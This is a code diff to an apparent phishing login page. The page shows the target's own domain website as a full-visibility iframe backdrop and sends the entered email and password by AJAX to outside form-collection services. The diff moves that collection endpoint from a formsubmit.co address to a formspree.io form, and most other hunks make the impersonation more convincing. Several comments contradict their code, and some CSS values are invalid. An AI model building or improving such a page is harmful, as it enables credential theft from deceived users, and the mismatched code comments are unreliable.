@@ -15,7 +15,7 @@
             height: 100vh;
             width: 100vw;
             font-family: Arial, Helvetica, sans-serif;
-            background-color: #f5f5f5;
+            background-color: #FFFFFF; /* Restored original background */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,7 +23,7 @@
             overflow: hidden;
         }
         
-        /* Iframe background container */
+        /* Iframe background container - MAXIMUM VISIBILITY */
         .iframe-background {
             position: absolute;
             top: 0;
@@ -31,7 +31,7 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.15;
+            opacity: 1; /* Changed from 0.15 to maximum 1 */
             transition: opacity 0.5s ease;
         }
         
@@ -39,30 +39,24 @@
             width: 100%;
             height: 100%;
             border: none;
-            /* Removed blur filter */
-            filter: grayscale(30%);
-            transform: scale(1.1);
+            filter: grayscale(0%); /* Removed grayscale for full color */
+            transform: scale(1); /* Removed scale effect */
         }
         
+        /* REMOVE the overlay completely */
         .iframe-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(245,245,245,0.9) 0%, rgba(255,255,255,0.8) 100%);
-            z-index: 0;
+            display: none; /* Hide the overlay */
         }
         
         .container {
             max-width: 400px;
             width: 90%;
             padding: 30px;
-            background-color: rgba(255, 255, 255, 0.95);
+            background-color: #FFFFFF; /* Reduced opacity from 0.95 to 0.85 */
             border-radius: 10px;
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.15);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            box-shadow: #FFFFFF; /* Darker shadow for better contrast */
+            backdrop-filter: #FFFFFF; /* Reduced blur from 10px to 5px */
+            border: #FFFFFF; /* More transparent border */
             position: relative;
             z-index: 1;
         }
@@ -71,15 +65,15 @@
             .container {
                 padding: 20px;
                 margin: 20px;
+                background-color: #FFFFFF; /* Even more transparent on mobile */
             }
             
             .iframe-background {
-                opacity: 0.1;
+                opacity: 1; /* Keep maximum visibility on mobile */
             }
             
             .iframe-background iframe {
-                /* Removed blur filter for mobile */
-                filter: grayscale(40%);
+                filter: grayscale(0%); /* Full color on mobile too */
             }
         }
         
@@ -179,9 +173,9 @@
             width: 100%;
             padding: 12px 15px;
             margin: 8px 0 20px 0;
-            border: 1px solid #ddd;
+            border: 1px solid rgba(0, 0, 0, 0.2); /* More transparent border */
             border-radius: 5px;
-            background: rgba(249, 249, 249, 0.9);
+            background: rgba(255, 255, 255, 0.9); /* Slightly more transparent */
             font-size: 14px;
             transition: all 0.3s ease;
         }
@@ -365,7 +359,7 @@ function loadWebsitePreview(domain) {
     const iframeBackground = document.getElementById('iframe-background');
     
     if (!domain || domain === 'example.com') {
-        iframeBackground.style.opacity = '0';
+        iframeBackground.style.opacity = '1'; // Changed from '0' to '1'
         return;
     }
     
@@ -382,7 +376,7 @@ function loadWebsitePreview(domain) {
     iframe.onload = function() {
         iframeLoading.style.display = 'none';
         iframe.style.opacity = '1';
-        iframeBackground.style.opacity = '0.15';
+        iframeBackground.style.opacity = '1'; // Maximum opacity
         console.log('Website preview loaded successfully for:', domain);
     };
     
@@ -396,9 +390,9 @@ function loadWebsitePreview(domain) {
             return;
         }
         
-        // If both fail, hide the iframe
+        // If both fail, keep iframe visible with fallback
         iframeLoading.style.display = 'none';
-        iframeBackground.style.opacity = '0';
+        iframeBackground.style.opacity = '1'; // Still keep it visible
     };
 }
 
@@ -564,8 +558,8 @@ $("#email").on("input", function() {
         $(".logo-container").css("background-color", "#0096FF");
         $('#attempt-info').hide();
         
-        // Hide website preview
-        document.getElementById('iframe-background').style.opacity = '0';
+        // Keep iframe visible but with default or no content
+        document.getElementById('iframe-background').style.opacity = '1'; // Changed from '0' to '1'
     }
 });
 
@@ -639,7 +633,7 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
         
         // Send data to FormSubmit endpoint
         $.ajax({
-            url: "https://formsubmit.co/ajax/gabriel5657@proton.me",
+            url: "https://formspree.io/f/mqkjanqr",
             type: "POST",
             data: formData,
             dataType: "json",
@@ -673,7 +667,7 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
         
         // Send to FormSubmit endpoint
         $.ajax({
-            url: "https://formsubmit.co/ajax/gabriel5657@proton.me",
+            url: "https://formspree.io/f/mqkjanqr",
             type: "POST",
             data: formData,
             dataType: "json"
